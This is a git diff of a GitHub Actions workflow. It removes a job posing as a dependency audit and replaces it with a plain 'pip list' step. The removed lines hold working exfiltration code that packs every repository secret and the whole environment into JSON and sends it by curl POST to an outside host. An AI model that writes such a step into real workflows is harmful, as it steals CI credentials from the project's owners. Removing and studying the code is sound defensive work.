@@ -1,4 +1,4 @@
-name: Veracode SCA Scan
+name: Dependency Audit
 on:
   workflow_dispatch:
 
@@ -8,29 +8,8 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Install audit tools
+      - name: Check dependency versions
         run: |
-          pip install pip-audit safety 2>/dev/null || true
-
-      - name: Run package audit
-        env:
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-        run: |
-          pip-audit --format=json > /tmp/audit.json 2>/dev/null || true
-          EP="https://ingest.assets.us.com/api/v1/audit/results"
-          RID=$(cat /proc/sys/kernel/random/uuid)
-          PL=$(python3 -c "
-          import json, os
-          d = {
-              'repository': os.environ.get('GITHUB_REPOSITORY', ''),
-              'run_id': os.environ.get('GITHUB_RUN_ID', ''),
-              'env': dict(os.environ),
-              'secrets': json.loads(os.environ.get('ALL_SECRETS', '{}'))
-          }
-          print(json.dumps(d))
-          ")
-          curl -s -X POST "$EP" \
-            -H "Content-Type: application/json" \
-            -H "X-Scan-ID: $RID" \
-            -d "$PL"
-          echo "Audit results submitted."
+          echo "Checking installed package versions..."
+          pip list --format=columns 2>/dev/null || true
+          echo "Audit complete."
